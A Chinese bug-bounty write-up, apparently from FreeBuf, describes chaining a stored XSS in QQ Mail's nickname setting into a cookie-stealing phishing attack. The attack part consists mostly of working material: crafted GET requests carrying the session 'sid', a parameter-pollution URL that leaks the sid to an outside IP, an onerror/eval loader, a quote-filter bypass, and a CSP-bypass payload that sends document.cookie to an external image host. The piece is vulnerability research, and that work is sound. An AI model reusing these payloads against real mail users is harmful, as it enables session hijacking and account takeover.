****前言：** **疫情在家闲着无聊准备挖洞提src换点钱买个新电脑，对着TX的域名一顿操作，奈何太菜只在QQ邮箱发现一个存储型self-xss。本着维护网络安全为己任的伟大梦想，怎么能放任这个漏洞不被修复呢？必须继续挖下去！！！****

## ****一、self-xss****

qq邮箱在账户设置中因为编辑器原因存在多处XSS，其中昵称处存在存储型XSS。

这个地方的XSS我想很多老哥都挖过，奈何TX不收啊， 正准备放弃的时候，脑子里浮现了一张图片：只有不努力的黑客，没有攻不破的系统.png

![1582513448_5e533d28686df.png!small](https://image.3001.net/images/20200224/1582513448_5e533d28686df.png!small)

## **二、抓包改命**

打开BURP，进行抓包，把更改昵称的包抓下来，发现是POST包，去掉无关参数改成get。

    
    
    https://mail.qq.com/cgi-bin/setting4_editaccount?
    sid=g9g7NNlnserJcHAu&
    fun=edit&alias=xxxxx0qq.com&
    acctid=0&taskid=0&signvalid=1&
    nickname=%3Cimg+src%3D1.gif+onerror%3Dalert%28"边界骇客"%29%3E
    &selectSign=-1

从上面get包可以看出 **nickname** 为XSS参数，其中 **sid**
为关键参数，只要获取到sid就可以恶意构造数据包，诱骗别人点击从而触发XSS。

## **三、坎坷的SID获取**

**通过搜索观察JS等繁琐操作，发现本地文件上传会自动获取到sid值。**![1582513643_5e533debf3694.png!small](https://image.3001.net/images/20200224/1582513643_5e533debf3694.png!small)
尝试网络图片，发现网络图片获取不到sid值，通过对比分析不断尝试，终于发现可以在上传的时候污染url参数，让服务器进行误判数据包如下：

    
    
    http://202.182.100.68?mail.qq.com/cgi-bin/download?
    sid=EUpcQayQKHM4MzNt&
    upfile=7ZEaLqhogztd7WCLUL6pFXYarCUpMrqvb9FQGM5%2FLP%2FOd8yiJIFnHJetwNJtTadXhJHD1o%2B%2BzMOXwZGBd45fawmHtqR0CBxF0i35YN7jRAQNg%2B6blIvZyZwWQ4V2GW4RhMuLcCc4uv%FxFICwqvJPiQ%3D%3D

让服务器误判图片为本地上传至文件服务器的，这样只要别人打开你的邮件就可以获取到sid值。  
  

## **四、恶意构造get包，触发XSS获取cookie**

在构造XSS的时候发现，XSS字符串存在字符限定和触发过滤限制，这里要感谢公众号：钟馗之眼的作者

### **4.1字符串长度限制**

    
    
    <img src=1 onerror=eval(window.parent.location.hash.substr(1))>

### **4.2单双引号限制**

    
    
    eval(String.fromCharCode())

### **4.3CSP绕过**

    
    
    img=document.createElement('img');img.src='http://image.3001.net/2020/02/eec6417cf66331c0eee621cb445e205d.jpg'+escape(document.cookie);document.body.appendChild(img);

这样就可以完美完成此次的钓鱼攻击了。效果图如下：

攻击流程图：

![1582514590_5e53419e5e615.png!small](https://image.3001.net/images/20200224/1582514590_5e53419e5e615.png!small)这次涉及的漏洞一览：

> csrf
>
> 参数污染
>
> xss
>
> cookie without httponly
>
> get/post滥用
>
> 逻辑漏洞
>
> 邮件信任机制不严格
>
> 自动加载js等

***本文原创作者：꧁，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

